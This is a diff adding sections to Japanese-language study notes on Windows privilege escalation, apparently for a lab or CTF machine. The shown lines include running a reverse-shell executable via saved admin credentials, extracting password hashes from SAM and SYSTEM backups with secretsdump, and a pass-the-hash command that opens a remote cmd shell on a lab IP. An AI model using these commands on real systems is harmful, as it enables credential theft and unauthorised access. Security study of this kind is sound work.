@@ -68,6 +68,17 @@ cmdkey /list
 で、保存されている認証情報を列挙し、admin がある場合、以下のコマンドで、リバースシェルを実行
 runad /savecred /user:admin C:\PrivEsc\reverse.exe
 
+【6. SAM と SYSYEM からハッシュ値を取得】
+C:\Windows\Repair\SAM
+C:\Windows\Repair\SYSTEM
+
+kali に インストールされている samdump2 は、Windows 10 のハッシュには使えない。
+secretdump.py なら Windows 10に対応
+python3 ../bin/secretdump.py -sam SAM -system SYSTEM LOCAL
+
+【7. pass the hash のコマンド】
+以下のコマンドでハッシュ値のみで、cmd プロンプトを操作可能
+pth-winexe -U 'admin%<hash>' //10.10.236.247 cmd.exe
 
 
 
